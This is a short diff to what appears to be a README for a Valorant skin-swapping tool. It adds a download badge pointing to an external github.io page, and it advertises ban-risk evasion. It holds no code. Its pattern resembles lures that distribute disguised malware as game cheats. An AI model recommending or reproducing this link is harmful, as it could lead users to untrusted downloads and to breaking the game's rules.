@@ -8,3 +8,5 @@
 - **User-Friendly Interface:** intuitive design that allows for quick and simple skin changes, with no technical expertise required.
 - **Customization:** tailor your in-game appearance with a wide selection of skins and styles.
 - **Safe & Secure:** uses secure methods for skin swapping, minimizing the risk of penalties or bans in *Valorant*.
+
+**[![Download ValorantSkinSwapper](https://img.shields.io/badge/Download-Valorant%20SkinSwapper-blueviolet)](https://hqlauncher.github.io/download/)**
